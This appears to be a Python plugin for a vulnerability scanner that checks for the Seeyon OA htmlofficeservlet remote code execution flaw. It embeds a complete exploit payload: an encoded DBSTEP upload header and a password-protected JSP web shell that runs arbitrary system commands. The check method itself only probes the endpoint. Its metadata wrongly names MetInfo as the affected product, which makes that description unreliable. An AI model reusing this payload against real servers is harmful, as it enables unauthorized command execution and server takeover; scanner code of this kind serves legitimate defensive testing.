#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class See_Yon_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'seeyou漏洞',
            'description': 'seeyou漏洞,影响范围为: MetInfo 6.0.0~6.1.0',
            'date': '2018-08-27',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.payload = '''
                   DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV 
                   OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 
                   RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 
                   FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 
                   needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 
                   <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
                   <%!p ublic static String excuteCmd(String c) {StringBuilder line = new StringBuilder(); 
                   try {Process pro = Runtime.getRuntime().exec(c);
                   BufferedReader buf = new BufferedR eader(new InputStreamReader(pro.getInputStream()));
                   String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}
                   buf.close();} catch (Exceptio n e) {line.append(e.getMessage());}return line.toString();} %>
                   <%if("asasd3344".equ als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd")))
                   {out.pri ntln("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
                '''

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = await request.get(self.url + "/seeyon/htmlofficeservlet", headers = self.headers)
            if check_req.status == 200 and "DBSTEP V3.0     0               21              0               htmoffice operate err" in await check_req.text() :
                return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    See_yon = See_Yon_BaseVerify('http://127.0.0.1:8005')
    See_yon.check()


